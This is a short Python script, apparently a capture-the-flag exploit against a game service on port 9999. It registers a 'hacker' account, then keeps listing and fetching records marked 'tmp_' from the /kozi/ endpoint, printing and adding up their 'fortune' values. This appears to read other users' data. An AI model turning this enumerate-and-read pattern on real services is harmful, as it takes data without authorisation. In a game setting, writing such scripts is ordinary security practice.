import sys
import requests
import json

ip = sys.argv[1]

url = f"http://{ip}:9999/api"

s = requests.Session()

r=s.post(f"{url}/register/", json={
    "username": "hacker",
    "password": "hacker"
})

r=s.post(f"{url}/login/", json={
    "username": "hacker",
    "password": "hacker"
})

d = {}

while True:
    try:
        l = requests.get(f"{url}/list/").json()['result']
        for k in l[::-1]:
            if "tmp_" not in k:
                continue
            try:
                kozi = s.get(f"{url}/kozi/{k}/").json()['result']
                print(kozi)
                fortune = kozi['fortune']
                name = kozi['name']
                pipe = kozi.get('pipe')
                if pipe is not None:
                    d[pipe.split('_')[1]] = fortune
                if d.get(name) is not None:
                    d[name] += fortune
                else:
                    d[name] = fortune
                print(d[name])
            except:
                pass
    except:
        pass